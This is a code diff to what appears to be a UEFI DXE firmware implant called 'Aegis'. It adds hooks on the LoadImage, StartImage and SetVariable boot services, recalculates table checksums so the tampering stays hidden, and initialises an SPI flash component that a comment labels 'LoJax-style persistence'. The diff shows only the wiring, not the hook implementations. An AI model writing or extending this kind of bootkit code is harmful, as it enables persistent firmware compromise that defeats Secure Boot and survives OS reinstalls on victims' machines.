@@ -12,6 +12,10 @@
 
 #include "DxeInject.h"
 #include "KillSwitch.h"
+#include "LoadImageHook.h"
+#include "StartImageHook.h"
+#include "SetVariableHook.h"
+#include "SpiFlashEmulator.h"
 
 //
 // Global hook context
@@ -22,6 +26,19 @@ STATIC AEGIS_HOOK_CONTEXT  mHookContext = {
   .HooksInstalled  = FALSE,
   .HookCount       = 0,
   .InstallTime     = 0
+};
+
+//
+// SPI Flash Emulator context
+//
+STATIC SPI_FLASH_EMULATOR  mSpiEmulator = {
+  .Signature            = 0,
+  .Initialized          = FALSE,
+  .FlashMemory          = NULL,
+  .FlashSize            = 0,
+  .WriteCount           = 0,
+  .EraseCount           = 0,
+  .PersistenceInstalled = FALSE
 };
 
 //
@@ -64,6 +81,15 @@ DxeInjectEntry (
   //
   DEBUG ((DEBUG_INFO, "[Aegis] Validating security constraints...\n"));
   KillSwitchResult = ValidateKillSwitches ();
+
+  //
+  // Initialize SPI Flash Emulator (Phase 6: LoJax-style persistence)
+  //
+  DEBUG ((DEBUG_INFO, "[Aegis] Initializing SPI flash emulator...\n"));
+  Status = InitializeSpiFlashEmulator (&mSpiEmulator);
+  if (EFI_ERROR (Status)) {
+    DEBUG ((DEBUG_WARN, "[Aegis] SPI emulator init failed: %r\n", Status));
+  }
 
   switch (KillSwitchResult) {
     case KillSwitchSuccess:
@@ -165,16 +191,47 @@ InstallBootServicesHooks (
   gBS->CreateEvent  = HookedCreateEvent;
 
   //
+  // Install new high-value hooks (Phase 3)
+  //
+  DEBUG ((DEBUG_INFO, "[Aegis] Installing high-value target hooks...\n"));
+  
+  // LoadImage hook (bootloader manipulation)
+  Status = InstallLoadImageHook ();
+  if (EFI_ERROR (Status)) {
+    DEBUG ((DEBUG_WARN, "[Aegis] LoadImage hook failed: %r\n", Status));
+  }
+
+  // StartImage hook (image execution interception)
+  Status = InstallStartImageHook ();
+  if (EFI_ERROR (Status)) {
+    DEBUG ((DEBUG_WARN, "[Aegis] StartImage hook failed: %r\n", Status));
+  }
+
+  // SetVariable hook (Secure Boot tampering detection)
+  Status = InstallSetVariableHook ();
+  if (EFI_ERROR (Status)) {
+    DEBUG ((DEBUG_WARN, "[Aegis] SetVariable hook failed: %r\n", Status));
+  }
+
+  //
   // Update CRC32 of Boot Services table
   // This is required for UEFI compliance
   //
   gBS->Hdr.CRC32 = 0;
   gBS->CalculateCrc32 (gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);
 
-  Context->HooksInstalled = TRUE;
-  Context->HookCount      = 3;
+  //
+  // Update CRC32 of Runtime Services table (for SetVariable)
+  //
+  gRT->Hdr.CRC32 = 0;
+  gRT->CalculateCrc32 (gRT, gRT->Hdr.HeaderSize, &gRT->Hdr.CRC32);
 
-  DEBUG ((DEBUG_INFO, "[Aegis] Installed %d hooks\n", Context->HookCount));
+  Context->HooksInstalled = TRUE;
+  Context->HookCount      = 6;  // 3 original + 3 new hooks
+
+  DEBUG ((DEBUG_INFO, "[Aegis] Installed %d hooks successfully\n", Context->HookCount));
+  DEBUG ((DEBUG_INFO, "[Aegis]   - AllocatePool, FreePool, CreateEvent\n"));
+  DEBUG ((DEBUG_INFO, "[Aegis]   - LoadImage, StartImage, SetVariable\n"));
 
   return EFI_SUCCESS;
 }
